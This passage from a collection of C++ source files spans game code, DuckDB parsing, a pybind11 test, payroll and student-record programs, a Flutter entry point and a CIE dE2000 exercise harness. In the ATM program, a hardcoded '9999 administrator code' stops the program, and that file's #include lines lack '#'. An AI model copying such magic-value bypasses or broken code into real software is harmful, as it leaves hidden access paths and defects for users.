< num; ++i)\n\t\tRedo_Impl();\n}\n\nvoid UCommandHistoryFixedSize::RedoAll_Implementation()\n{\n\tRedoNum(LastIndex - CurrentIndex);\n}\n\nvoid UCommandHistoryFixedSize::Redo_Impl()\n{\n\t++CurrentIndex;\n\tTScriptInterface<ICommand> Command = History[TrueIndex(CurrentIndex)];\n\tICommand::Execute_Do(Command.GetObject());\n}\n\n#pragma endregion\n\n#pragma region Clear\n\nvoid UCommandHistoryFixedSize::Clear_Implementation()\n{\n\t// Clear history without re-allocating array\n\tfor (size_t i = LastIndex; i > 0; --i) \n\t\tCommandUtil::DestroyCommand(History[TrueIndex(i)]);\n\n\tHistory.Init(NULL, MaxSize);\n\tLastIndex = CurrentIndex = -1;\n\tIndexOffset = 0;\n}\n\nvoid UCommandHistoryFixedSize::ClearRedoable()\n{\n\tif (LastIndex == CurrentIndex) return;\n\n\tfor (size_t i = LastIndex; i > CurrentIndex; --i) \n\t{\n\t\tCommandUtil::DestroyCommand(History[TrueIndex(i)]);\n\t\tHistory[TrueIndex(i)] = NULL;\n\t}\n\tLastIndex = CurrentIndex;\n}\n\n#pragma endregion",
    "#include \"duckdb/parser/expression/cast_expression.hpp\"\n\n#include \"duckdb/common/exception.hpp\"\n\n#include \"duckdb/common/serializer/serializer.hpp\"\n#include \"duckdb/common/serializer/deserializer.hpp\"\n\nnamespace duckdb {\n\nCastExpression::CastExpression(LogicalType target, unique_ptr<ParsedExpression> child, bool try_cast_p)\n    : ParsedExpression(ExpressionType::OPERATOR_CAST, ExpressionClass::CAST), cast_type(std::move(target)),\n      try_cast(try_cast_p) {\n\tD_ASSERT(child);\n\tthis->child = std::move(child);\n}\n\nCastExpression::CastExpression() : ParsedExpression(ExpressionType::OPERATOR_CAST, ExpressionClass::CAST) {\n}\n\nstring CastExpression::ToString() const {\n\treturn ToString<CastExpression, ParsedExpression>(*this);\n}\n\nbool CastExpression::Equal(const CastExpression &a, const CastExpression &b) {\n\tif (!a.child->Equals(*b.child)) {\n\t\treturn false;\n\t}\n\tif (a.cast_type != b.cast_type) {\n\t\treturn false;\n\t}\n\tif (a.try_cast != b.try_cast) {\n\t\treturn false;\n\t}\n\treturn true;\n}\n\nunique_ptr<ParsedExpression> CastExpression::Copy() const {\n\tauto copy = make_uniq<CastExpression>(cast_type, child->Copy(), try_cast);\n\tcopy->CopyProperties(*this);\n\treturn std::move(copy);\n}\n\n} // namespace duckdb\n",
    "#include \"Animation.hpp\"\n\nAnimation::Animation(FacingDirection direction)\n    : frames(0), currentFrameIndex(0), currentFrameTime(0.f), direction(direction)\n{}\n\nvoid Animation::AddFrame(int textureId, int x, int y, \n        int width, int height, float frameTime)\n{\n    FrameData data;\n    data.id = textureId;\n    data.x = x;\n    data.y = y;\n    data.width = width;\n    data.height = height;\n    data.displayTimeSeconds = frameTime;\n\n    frames.push_back(data);\n}\n\nconst FrameData* Animation::GetCurrentFrame() const\n{\n    if(frames.size() > 0)\n    {\n        return &frames[currentFrameIndex];\n    }\n\n    return nullptr;\n}\n\nbool Animation::UpdateFrame(float deltaTime)\n{\n    if(frames.size() > 0)\n    {\n        currentFrameTime += deltaTime;\n\n        if(currentFrameTime >= frames[currentFrameIndex].displayTimeSeconds)\n        {\n            currentFrameTime = 0.f;\n            IncrementFrame();\n            return true;\n        }\n    }\n\n    return false;\n}\n\nvoid Animation::IncrementFrame()\n{\n    currentFrameIndex = (currentFrameIndex + 1) % frames.size();\n}\n\nvoid Animation::Reset()\n{\n    currentFrameIndex = 0;\n    currentFrameTime = 0.f;\n}\n\nvoid Animation::SetDirection(FacingDirection dir)\n{\n\n    //Makes sure we no not flip the sprite \n    //unless it's a new direction\n    if(direction != dir)\n    {\n        direction = dir;\n        for(auto& f : frames)\n        {\n            f.x += f.width;\n            f.width *= -1;\n        }\n    }\n}\n\nFacingDirection Animation::GetDirection() const\n{\n    return direction;\n}",
    "#include <cmath>\n#include <cstdio>\n\nstruct XYZ {\n    double x;\n    double y;\n    double z;\n};\n\n// Use these values for D65 whitepoint.\n// published values vary slightly, and will affect the results.\nXYZ d65WhitePoint = { 95.0489, 100.0, 108.8840};\n\n\n// This function should implement the CIE dE 2000 colour difference\ndouble deltaE_CIE2000(const XYZ& a, const XYZ& b);\n\n\nstruct TestVector {\n    int id;\n    XYZ a;\n    XYZ b;\n    double dE;\n};\n\nTestVector tests[] = {\n    {  1, {       18.0,  18.421875,   98.71875 }, {       17.5,  18.421875, 103.328125 }, 2.0428693215228901 },\n    {  2, {   18.09375,  18.421875,  94.953125 }, {       17.5,  18.421875, 103.328125 }, 2.8704685611441016 },\n    {  3, {   18.03125,  18.421875,  90.171875 }, {       17.5,  18.421875, 103.328125 }, 3.44367359586365 },\n    {  4, {      17.25,  18.421875, 105.765625 }, {       17.5,  18.421875, 103.328125 }, 0.98953039312009172 },\n    {  5, {   17.28125,  18.421875, 106.609375 }, {       17.5,  18.421875, 103.328125 }, 1.0029552436525526 },\n    {  6, {   17.34375,  18.421875, 107.765625 }, {       17.5,  18.421875, 103.328125 }, 0.97417324220258006 },\n    {  7, {       17.5,  18.421875,    20.0625 }, {  17.328125,  18.421875,  19.015625 }, 2.3224208445484056 },\n    {  8, {  17.328125,  18.421875,  19.015625 }, {       17.5,  18.421875,    20.0625 }, 2.3224208445484056 },\n    {  9, {   17.96875,  18.421875,    20.0625 }, {  17.046875,  18.421875,  20.046875 }, 7.2394063666101118 },\n    { 10, {   17.96875,  18.421875,    20.0625 }, {  17.046875,  18.421875,  20.046875 }, 7.2394063666101118 },\n    { 11, {   17.96875,  18.421875,    20.0625 }, {  17.046875,  18.421875,  20.046875 }, 7.2394063666101118 },\n    { 12, {   17.96875,  18.421875,    20.0625 }, {  17.046875,  18.421875,  20.046875 }, 7.2394063666101118 },\n    { 13, {       17.5,  18.421875,  18.765625 }, {       17.5,  18.421875,   21.40625 }, 4.8166832023426167 },\n    { 14, {       17.5,  18.421875,  18.765625 }, {       17.5,  18.421875,   21.40625 }, 4.8166832023426167 },\n    { 15, {       17.5,  18.421875,  18.765625 }, {       17.5,  18.421875,   21.40625 }, 4.8166832023426167 },\n    { 16, {   17.96875,  18.421875,    20.0625 }, {       17.5,  18.421875,   21.40625 }, 4.3294648525052608 },\n    { 17, {   17.96875,  18.421875,    20.0625 }, {     51.875,  45.171875,   68.59375 }, 27.160687903094356 },\n    { 18, {   17.96875,  18.421875,    20.0625 }, {    26.5625,      29.25,  15.203125 }, 22.874523554449674 },\n    { 19, {   17.96875,  18.421875,    20.0625 }, {  17.296875,   23.90625,   27.96875 }, 31.784604209825009 },\n    { 20, {   17.96875,  18.421875,    20.0625 }, {  30.671875,   25.96875,  19.421875 }, 19.476261849382428 },\n    { 21, {   17.96875,  18.421875,    20.0625 }, {   18.09375,  18.421875,      19.75 }, 0.99603164263017707 },\n    { 22, {   17.96875,  18.421875,    20.0625 }, {     18.125,  18.421875,    20.0625 }, 1.0414923919236823 },\n    { 23, {   17.96875,  18.421875,    20.0625 }, {  17.859375,  18.421875,      19.75 }, 0.95305102475035275 },\n    { 24, {   17.96875,  18.421875,    20.0625 }, {  18.109375,  18.421875,     19.875 }, 0.99326866414194748 },\n    { 25, {  19.453125,   28.40625,      11.75 }, {  19.609375,  28.640625,  10.734375 }, 1.2804838792912299 },\n    { 26, {   22.53125,   31.59375,  39.046875 }, {  22.640625,     31.375,  37.328125 }, 1.2730197313816478 },\n    { 27, {    29.0625,  29.578125,   36.28125 }, {   28.84375,  29.734375,     36.125 }, 1.8229382999799022 },\n    { 28, {    4.15625,   8.546875,   8.140625 }, {   4.421875,   8.515625,   8.765625 }, 1.841290832234854 },\n    { 29, {    4.96875,    3.71875,     19.875 }, {   4.671875,     3.8125,  18.046875 }, 2.075123140549433 },\n    { 30, {  15.640625,       9.25,    5.09375 }, {  15.953125,    9.15625,   4.453125 }, 1.4155796660121873 },\n    { 31, {    73.1875,  78.046875,       83.0 }, {     74.125,    78.8125,  85.765625 }, 1.458222602968178 },\n    { 32, {    74.1875,    78.3125,    86.5625 }, {   69.34375,   73.40625,  80.890625 }, 1.5635548124666301 },\n    { 33, {   0.703125,       0.75,   0.984375 }, {   0.609375,    0.65625,   0.859375 }, 0.6553561450639207 },\n    { 34, {    0.21875,   0.234375,   0.328125 }, {    0.09375,    0.09375,   0.140625 }, 1.024061208946461}\n};\n\n\nint main() {\n    const int numTests = sizeof(tests) / sizeof(tests[0]);\n    const double tolerance = 0.01;\n    \n    int numFailures = 0;\n    for (int i = 0; i < numTests; i++) {\n        const TestVector& test = tests[i];\n        double diff = deltaE_CIE2000(test.a, test.b);\n        if (std::abs(diff - test.dE) > tolerance) {\n            std::fprintf(stderr, \"Failed: %d, expected %f - got %f (delta: %f)\\n\", test.id, test.dE, diff, std::abs(diff - test.dE));\n            numFailures++;\n        }\n    }\n\n    if (numFailures == 0) {\n        std::fprintf(stderr, \"Passed\\n\");\n    }\n}\n\n/*\n Put your implementation of CIE dE2000 here...\n*/\n\n/*\nThe formula for CIE dE2000 was taken from:\nhttps://en.wikipedia.org/wiki/Color_dif",
    "#include<iostream>\n#include <limits>\n#include <algorithm>\nusing namespace std;\nclass Persona{\nprivate:\n\tint id;\n\tstring nombre;\n\tstring apellidoPaterno;\n\tstring apellidoMaterno;\n\tstring sexo;\n\tint edad;\n\tstring direccion;\n\tint telefono;\n\tstring puesto;\n\tstring departamento;\n\tint horasTrabajadas;\n\tdouble costoPorHora;\n\tdouble sueldo;\npublic:\n\tPersona() : id(0), nombre(\"\"), apellidoPaterno(\"\"),\n\tapellidoMaterno(\"\"), sexo(\"\"), edad(0), direccion(\"\"), telefono(0),\n\tpuesto(\"\"), departamento(\"\"), horasTrabajadas(0), costoPorHora(0),\n\tsueldo(0) {}\n\n\n\tPersona(int _id,string _nombre,string _apellidoPaterno,string _apellidoMaterno,\n\tstring _sexo,int _edad,string _direccion,int _telefono,string _puesto,string _departamento,\n\tint _horasTrabajadas,double _costoPorHora,double _sueldo):id(_id), nombre(_nombre), apellidoPaterno(_apellidoPaterno),\n\tapellidoMaterno(_apellidoMaterno), sexo(_sexo), edad(_edad), direccion(_direccion), telefono(_telefono),\n\tpuesto(_puesto), departamento(_departamento), horasTrabajadas(_horasTrabajadas), costoPorHora(_costoPorHora),\n\tsueldo(_horasTrabajadas * _costoPorHora) {}\n\n\tvoid setdatos(int _id,string _nombre,string _apellidoPaterno,string _apellidoMaterno,\n\tstring _sexo,int _edad,string _direccion,int _telefono,string _puesto,string _departamento,\n\tint _horasTrabajadas,double _costoPorHora,double _sueldo)\n\t{\n\tid = _id;\n\tnombre = _nombre;\n\tapellidoPaterno = _apellidoPaterno;\n\tapellidoMaterno = _apellidoMaterno;\n\tsexo = _sexo;\n\tedad = _edad;\n\tdireccion = _direccion;\n\ttelefono = _telefono;\n\tpuesto = _puesto;\n\tdepartamento = _departamento;\n\thorasTrabajadas = _horasTrabajadas;\n\tcostoPorHora = _costoPorHora;\n\tsueldo = _horasTrabajadas * _costoPorHora;\n\t}\n\n\t\tvoid setid(int i)\n\t{\n\t    id = i;\n\t}\n\n\tvoid setnombre(string nom)\n\t{\n\t    nombre = nom;\n\t}\n\n\tvoid setap(string ap)\n\t{\n\t    apellidoPaterno = ap;\n\t}\n\n\tvoid setam(string am)\n\t{\n\t    apellidoMaterno = am;\n\t}\n\n\tvoid setsexo(string s)\n\t{\n\t    sexo = s;\n\t}\n\n\tvoid setedad(int e)\n\t{\n\t    edad = e;\n\t}\n\n\tvoid setdireccion(string di)\n\t{\n\t    direccion = di;\n\t}\n\n\tvoid settelefono(int t)\n\t{\n\t    telefono = t;\n\t}\n\n\tvoid setpuesto(string pue)\n\t{\n\t    puesto = pue;\n\t}\n\n\tvoid setdepartamento(string dep)\n\t{\n\t    departamento = dep;\n\t}\n\n\tvoid sethoras(int h)\n\t{\n\t    horasTrabajadas = h;\n\t}\n\n\tvoid setcosto(int c)\n\t{\n\t    costoPorHora = c;\n\t}\n\n\tint get_id() const {\n\t\treturn id;\n\t}\n\n\tstring getNombre(){\n\t\treturn nombre;\n\t}\n\n\tstring getApellidoPaterno(){\n\t\treturn apellidoPaterno;\n\t}\n\n\tstring getApellidoMaterno(){\n\t\treturn apellidoMaterno;\n\t}\n\n\tstring getSexo(){\n\t\treturn sexo;\n\t}\n\n\tint getEdad(){\n\t\treturn edad;\n\t}\n\n\tstring getDireccion(){\n\t\treturn direccion;\n\t}\n\n\tint getTelefono(){\n\t\treturn telefono;\n\t}\n\n\tstring getPuesto(){\n\t\treturn puesto;\n\t}\n\n\tstring getDepartamento(){\n\t\treturn departamento;\n\t}\n\n\tint getHorasTrabajadas(){\n\t\treturn horasTrabajadas;\n\t}\n\n\tdouble getCostoPorHora(){\n\t\treturn costoPorHora;\n\t}\n\n\tdouble getSueldo(){\n\t\treturn sueldo;\n\t}\n\n};\nstruct Nodo{\n\tPersona persona;\n\tNodo* siguiente;\n\tNodo(Persona _persona) : persona(_persona), siguiente(nullptr) {}\n\n};\n//prototipado de funcines\nvoid agregar(Nodo *&, Persona);\nvoid imprimirLista(Nodo *);\nvoid eliminar(Nodo *&, int);\nvoid modificar(Nodo *&, int);\nbool esLetra(const string &str);\nNodo* buscarPorID(Nodo *,int);\nNodo* buscarPorNombre(Nodo *,string);\nbool mensaje_mostrado = false;\n\nint main(){\n\tstring nombre, apellidoPaterno, apellidoMaterno, sexo, direccion,  puesto, departamento;\n\tint id,  edad, opcionConsulta, horasTrabajadas,telefono;\n\tdouble costoPorHora;\n\tPersona persona;\n\tNodo *lista=NULL;\n\tint opc;\n\tdo{\n\t\tcout<<\"---------\u00bfQu\u00e9 deseas realizar?-------------\"<<endl;\n\t\tcout<<\"1.-Dar de alta a un empleado\"<<endl;\n\t\tcout<<\"2.-Mostrar nomina de empleado\"<<endl;\n\t\tcout<<\"3.-Dar de baja a un empleado\"<<endl;\n\t\tcout<<\"4.-Realizar cambios en la nomina\"<<endl;\n\t\tcout<<\"5.-Consultar informacion de un empleado\"<<endl;\n\t\tcout<<\"6.-Salir\"<<endl;\n\t\t///cin>>opc;\n        while (!(cin >> opc || to_string(opc).length() != 1)) {\n            if (!mensaje_mostrado) {\n                cout << \"Ingrese 1 valor numerico: \";\n                mensaje_mostrado = true;\n            }\n            cin.clear();\n            cin.ignore(numeric_limits<streamsize>::max(), '\\n');\n        }\n\n\n\t\tswitch(opc){\n\n\t\t\tcase 1:\n\t\t\t\tcin.ignore();\n\t\t\t\tcout << \"Ingrese el ID del trabajador (6 caracteres): \";\n                while (!(cin >> id) || to_string(id).length() != 6) {\n                    if (!mensaje_mostrado) {\n                        cout << \"El ID del trabajador debe ser un n\u00famero entero de 6 d\u00edgitos. Int\u00e9ntalo de nuevo: \";;\n                        mensaje_mostrado = true;\n                    }\n                    cin.clear();\n                    cin.ignore(numeric_limits<streamsize>::max(), '\\n');\n                }\n\n    \t\t\tcin.ignore();\n\n\t\t\t\tcout << \"Ingrese el nombre del trabajador: \";\n                while (true) {\n                    getline(cin, nombre);\n                    if (!nombre.empty() && esLetra(nombre)) {\n                   ",
    "/*\n    tests/test_sequences_and_iterators.cpp -- supporting Pythons' sequence protocol, iterators,\n    etc.\n\n    Copyright (c) 2016 Wenzel Jakob <wenzel.jakob@epfl.ch>\n\n    All rights reserved. Use of this source code is governed by a\n    BSD-style license that can be found in the LICENSE file.\n*/\n\n#include <pybind11/operators.h>\n#include <pybind11/stl.h>\n\n#include \"constructor_stats.h\"\n#include \"pybind11_tests.h\"\n\n#include <algorithm>\n#include <utility>\n#include <vector>\n\n#ifdef PYBIND11_HAS_OPTIONAL\n#    include <optional>\n#endif // PYBIND11_HAS_OPTIONAL\n\ntemplate <typename T>\nclass NonZeroIterator {\n    const T *ptr_;\n\npublic:\n    explicit NonZeroIterator(const T *ptr) : ptr_(ptr) {}\n    const T &operator*() const { return *ptr_; }\n    NonZeroIterator &operator++() {\n        ++ptr_;\n        return *this;\n    }\n};\n\nclass NonZeroSentinel {};\n\ntemplate <typename A, typename B>\nbool operator==(const NonZeroIterator<std::pair<A, B>> &it, const NonZeroSentinel &) {\n    return !(*it).first || !(*it).second;\n}\n\n/* Iterator where dereferencing returns prvalues instead of references. */\ntemplate <typename T>\nclass NonRefIterator {\n    const T *ptr_;\n\npublic:\n    explicit NonRefIterator(const T *ptr) : ptr_(ptr) {}\n    T operator*() const { return T(*ptr_); }\n    NonRefIterator &operator++() {\n        ++ptr_;\n        return *this;\n    }\n    bool operator==(const NonRefIterator &other) const { return ptr_ == other.ptr_; }\n};\n\nclass NonCopyableInt {\npublic:\n    explicit NonCopyableInt(int value) : value_(value) {}\n    NonCopyableInt(const NonCopyableInt &) = delete;\n    NonCopyableInt(NonCopyableInt &&other) noexcept : value_(other.value_) {\n        other.value_ = -1; // detect when an unwanted move occurs\n    }\n    NonCopyableInt &operator=(const NonCopyableInt &) = delete;\n    NonCopyableInt &operator=(NonCopyableInt &&other) noexcept {\n        value_ = other.value_;\n        other.value_ = -1; // detect when an unwanted move occurs\n        return *this;\n    }\n    int get() const { return value_; }\n    void set(int value) { value_ = value; }\n    ~NonCopyableInt() = default;\n\nprivate:\n    int value_;\n};\nusing NonCopyableIntPair = std::pair<NonCopyableInt, NonCopyableInt>;\nPYBIND11_MAKE_OPAQUE(std::vector<NonCopyableInt>);\nPYBIND11_MAKE_OPAQUE(std::vector<NonCopyableIntPair>);\n\ntemplate <typename PythonType>\npy::list test_random_access_iterator(PythonType x) {\n    if (x.size() < 5) {\n        throw py::value_error(\"Please provide at least 5 elements for testing.\");\n    }\n\n    auto checks = py::list();\n    auto assert_equal = [&checks](py::handle a, py::handle b) {\n        auto result = PyObject_RichCompareBool(a.ptr(), b.ptr(), Py_EQ);\n        if (result == -1) {\n            throw py::error_already_set();\n        }\n        checks.append(result != 0);\n    };\n\n    auto it = x.begin();\n    assert_equal(x[0], *it);\n    assert_equal(x[0], it[0]);\n    assert_equal(x[1], it[1]);\n\n    assert_equal(x[1], *(++it));\n    assert_equal(x[1], *(it++));\n    assert_equal(x[2], *it);\n    assert_equal(x[3], *(it += 1));\n    assert_equal(x[2], *(--it));\n    assert_equal(x[2], *(it--));\n    assert_equal(x[1], *it);\n    assert_equal(x[0], *(it -= 1));\n\n    assert_equal(it->attr(\"real\"), x[0].attr(\"real\"));\n    assert_equal((it + 1)->attr(\"real\"), x[1].attr(\"real\"));\n\n    assert_equal(x[1], *(it + 1));\n    assert_equal(x[1], *(1 + it));\n    it += 3;\n    assert_equal(x[1], *(it - 2));\n\n    checks.append(static_cast<std::size_t>(x.end() - x.begin()) == x.size());\n    checks.append((x.begin() + static_cast<std::ptrdiff_t>(x.size())) == x.end());\n    checks.append(x.begin() < x.end());\n\n    return checks;\n}\n\nTEST_SUBMODULE(sequences_and_iterators, m) {\n    // test_sliceable\n    class Sliceable {\n    public:\n        explicit Sliceable(int n) : size(n) {}\n        int start, stop, step;\n        int size;\n    };\n    py::class_<Sliceable>(m, \"Sliceable\")\n        .def(py::init<int>())\n        .def(\"__getitem__\", [](const Sliceable &s, const py::slice &slice) {\n            py::ssize_t start = 0, stop = 0, step = 0, slicelength = 0;\n            if (!slice.compute(s.size, &start, &stop, &step, &slicelength)) {\n                throw py::error_already_set();\n            }\n            int istart = static_cast<int>(start);\n            int istop = static_cast<int>(stop);\n            int istep = static_cast<int>(step);\n            return std::make_tuple(istart, istop, istep);\n        });\n\n    m.def(\"make_forward_slice_size_t\", []() { return py::slice(0, -1, 1); });\n    m.def(\"make_reversed_slice_object\",\n          []() { return py::slice(py::none(), py::none(), py::int_(-1)); });\n#ifdef PYBIND11_HAS_OPTIONAL\n    m.attr(\"has_optional\") = true;\n    m.def(\"make_reversed_slice_size_t_optional_verbose\",\n          []() { return py::slice(std::nullopt, std::nullopt, -1); });\n    // Warning: The following spelling may still compile if optional<> is not present and give\n    // wrong answers. Please use with caution.\n    m.def(\"make_reversed_slice_size_t_optional\", []()",
    "include <iostream>\ninclude <vector>\ninclude <algorithm>\nusing namespace std;\n\nstruct Banknote {\n    int value;\n    int count;\n};\n\nvector<Banknote> distributeBanknotes(int amount, const vector<Banknote>& availableBanknotes) {\n    vector<Banknote> distribution;\n\n    for (const Banknote& banknote : availableBanknotes) {\n        if (banknote.value <= amount) {\n            int banknoteCount = min(amount / banknote.value, banknote.count);\n            distribution.push_back({banknote.value, banknoteCount});\n            amount -= banknoteCount * banknote.value;\n\n            if (amount == 0)\n                break;\n        }\n    }\n\n    if (amount > 0) {\n        cout << \"Cannot distribute the requested amount.\\n\";\n        distribution.clear();\n    }\n\n    return distribution;\n}\n\nvoid printDistribution(const vector<Banknote>& distribution) {\n    cout << \"Distribution:\\n\";\n    for (const Banknote& banknote : distribution) {\n        cout << banknote.value << \": \" << banknote.count << \"\\n\";\n    }\n}\n\nint main() {\n    // Define available banknotes\n    vector<Banknote> availableBanknotes = {\n        {100, 10},\n        {50, 10},\n        {20, 20},\n        {10, 20},\n        {5, 50},\n        {1, 50}\n    };\n\n    // Get desired amount from user\n    int amount;\n    while (true) {\n        cout << \"Enter the amount you want to withdraw: \";\n        cin >> amount;\n\n        if (amount == 9999){\n            cout << \"System unstoppable with administrator code\" << endl;\n            break;}\n\n        // Distribute banknotes\n        vector<Banknote> distribution = distributeBanknotes(amount, availableBanknotes);\n\n        // Print distribution\n        printDistribution(distribution);\n    }\n\n    return 0;\n}\n",
    "#include<iostream>\r\n#include<fstream>\r\n#include<iomanip>\r\nusing namespace std;\r\n\r\nclass student\r\n{\r\n\tprivate:\r\n\t\t\r\n\tint rollno;\r\n\tchar name[50];\r\n\tint oop_marks, ds_marks, ca_marks, eng_marks, cs_marks;\r\n\tdouble per;    //stores average mark\r\n\tchar grade;    //stores grade obtained by the student\r\n\t\r\n\tpublic:\r\n\t\t\r\n\tvoid calculate();\t          // function to calculate grade\r\n\tvoid getdata();\t\t         // function to get data from user\r\n\tvoid showdata() const;\t    // function to display the data \r\n\tvoid show_tabular() const;  //function to display student details in tabular form\r\n\tint retrollno() const;      //function to return roll number\r\n\t\r\n}; \r\n\r\nvoid student::calculate()\r\n{\r\n\tper = (oop_marks + ds_marks + ca_marks + eng_marks + cs_marks) / 5.0;\r\n\t\r\n\tif(per>=80)\r\n\t\tgrade='A';\r\n\telse if(per>=70)\r\n\t\tgrade='B';\r\n\telse if(per>=50)\r\n\t\tgrade='C';\r\n\telse\r\n\t\tgrade='F';\r\n}\r\n\r\nvoid student::getdata()\r\n{\r\n\tcout<<\"\\nEnter the Roll number of student \"<<\"\\t\"<< \":\";\r\n\tcin>>rollno;\r\n\t\r\n\tcout<<\"\\n\\nEnter the Name of student \"<<\"\\t\\t\"<< \":\";\r\n\tcin.ignore();\r\n\tcin.getline(name,50);\r\n\t\r\n\tcout<<\"\\nEnter the marks scored in Object Oriented Programming \"<<\"\\t\"<< \":\" ;\r\n\tcin>>oop_marks;\r\n\t\r\n\tcout<<\"\\nEnter the marks scored in Data Structures \"<<\"\\t\\t\"<< \":\" ;\r\n\tcin>>ds_marks;\r\n\t\r\n\tcout<<\"\\nEnter the marks scored in Computer Architecture \"<<\"\\t\"<< \":\" ;\r\n\tcin>>ca_marks;\r\n\t\r\n\tcout<<\"\\nEnter the marks scored in English  \"<<\"\\t\\t\\t\"<< \":\" ;\r\n\tcin>>eng_marks;\r\n\t\r\n\tcout<<\"\\nEnter the marks scored in Computer Science \"<<\"\\t\\t\"<< \":\" ;\r\n\tcin>>cs_marks;\r\n\tcalculate();\r\n}\r\n\r\nvoid student::showdata() const\r\n{\r\n\tcout<<\"\\n Student Roll number \"<<\"\\t\"<< \":\" <<rollno;\r\n\tcout<<\"\\n Student Name \"<<\"\\t\\t\"<< \":\"<<name;\r\n\t\r\n\tcout<<\"\\n\\n MARKS SCORED BY THE STUDENT: \\n\";\r\n\tcout<<\"----- ------ -- --- --------\\n\";\r\n\t\r\n\tcout<<\"\\n Object Oriented Programming    :\"<<oop_marks;\r\n\tcout<<\"\\n Data Structures  \"<<\"\\t\\t\"<< \":\" <<ds_marks;\r\n\tcout<<\"\\n Computer Architecture  \"<<\"\\t\"<< \":\" <<ca_marks;\r\n\tcout<<\"\\n English \"<<\"\\t\\t\\t\"<< \":\"<<eng_marks;\r\n\tcout<<\"\\n Computer Science \"<<\"\\t\\t\"<< \":\"<<cs_marks;\r\n\t\r\n\tcout<<\"\\n\\n Percentage     :\"<<per;\r\n\tcout<<\"\\n Grade  \"<<\"\\t\"<< \":\"<<grade;\r\n}\r\n\r\nvoid student::show_tabular() const\r\n{\r\n\tcout<<rollno<<setw(6)<<\"\\t\"<<name<<setw(10)<<\"\\t\"<<oop_marks<<setw(4)<<\"\\t\"<<ds_marks<<setw(4)<<\"\\t\"<<ca_marks<<setw(4)<<\"\\t\"\r\n\t\t<<eng_marks<<setw(4)<<\"\\t\"<<cs_marks<<setw(8)<<\"\"<<per<<setw(6)<<\"\\t\"<<grade<<endl;\r\n}\r\n\r\nint  student::retrollno() const\r\n{\r\n\treturn rollno;\r\n}\r\n\r\n/* function declaration */\r\n\r\nvoid write_student();\t        // function to write the record in binary file\r\nvoid display_all();\t           // function to read records from binary file\r\nvoid display_sp(int);\t      // function to display specific record from binary file\r\nvoid modify_student(int);    // function to update record of binary file\r\nvoid delete_student(int);\t//function to delete selected records from binary file\r\nvoid class_result();\t   //function to display all records in tabular format \r\nvoid result();\t\t      //function to display result \r\nvoid intro();\t\t     //function to display welcome screen\r\nvoid entry_menu();\t    //function to display entry menu on screen\r\n\r\n\r\n\r\nint main()\r\n{\r\n\tchar ch;\r\n\tcout.setf(ios::fixed|ios::showpoint);\r\n\tcout<<setprecision(2);      // program outputs decimal number to two decimal places\r\n\tintro();\r\n\tdo\r\n\t{\r\n\t\tsystem(\"cls\");\r\n\t\tcout<<\"\\n\\n\\n\\t MAIN MENU\";\r\n\t\tcout<<\"\\n\\t ---- -----\";\r\n\t\t\r\n\t\tcout<<\"\\n\\n\\t 1. ENTRY/EDIT MENU \";\r\n\t\tcout<<\"\\n\\n\\t 2. RESULT MENU \";\r\n\t\tcout<<\"\\n\\n\\t 3. EXIT \";\r\n\t\tcout<<\"\\n\\n\\n\\t Please Select Your Option  \";\r\n\t\tcin>>ch;\r\n\t\tswitch(ch)\r\n\t\t{\r\n\t\t\tcase '1': entry_menu();\r\n\t\t\t\tbreak;\r\n\t\t\tcase '2': result();\r\n\t\t\t\tbreak;\r\n\t\t\tcase '3':\r\n\t\t\t\tbreak;\r\n\t\t\tdefault :cout<<\"\\a\";\r\n\t\t}\r\n    }while(ch!='3');\r\n\treturn 0;\r\n}\r\n\r\n\r\n/*  function to write in file  */\r\n\r\nvoid write_student()\r\n{\r\n\tstudent st;\r\n\tofstream outFile;\r\n\toutFile.open(\"student.dat\",ios::binary|ios::app);\r\n\tst.getdata();\r\n\toutFile.write(reinterpret_cast<char *> (&st), sizeof(student));\r\n\toutFile.close();\r\n    cout<<\"\\n\\nStudent record Has Been Created \";\r\n\tcin.ignore();\r\n\tcin.get();\r\n}\r\n\r\n\r\n/*  function to read all records from file  */\r\n\r\nvoid display_all()\r\n{\r\n\tstudent st;\r\n\tifstream inFile;\r\n\tinFile.open(\"student.dat\",ios::binary);\r\n\tif(!inFile)\r\n\t{\r\n\t\tcout<<\"File could not be open !! Press any Key...\";\r\n\t\tcin.ignore();\r\n\t\tcin.get();\r\n\t\treturn;\r\n\t}\r\n\tcout<<\"\\n\\n\\n\\t\\t ALL STUDENTS RECORD. \\n\\n\";\r\n\twhile(inFile.read(reinterpret_cast<char *> (&st), sizeof(student)))\r\n\t{\r\n\t\tst.showdata();\r\n\t\tcout<<\"\\n\\n_________\\n\";\r\n\t}\r\n\tinFile.close();\r\n\tcin.ignore();\r\n\tcin.get();\r\n}\r\n\r\n\r\n/*  function to read specific record from file  */\r\n\r\nvoid display_sp(int n)\r\n{\r\n\tstudent st;\r\n\tifstream inFile;\r\n\tinFile.open(\"student.dat\",ios::binary);\r\n\tif(!inFile)\r\n\t{\r\n\t\tcout<<\"File could not be open !! Press any Key...\";\r\n\t\tcin.ignore();\r\n\t\tcin.get();\r\n\t\treturn;\r\n\t}\r\n\tbool flag=false;\r\n\twhile(inFile.read(reinterpret_cast<char *> (&st), sizeof(student)))\r\n\t{\r\n\t\tif(st.retroll",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"chat_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
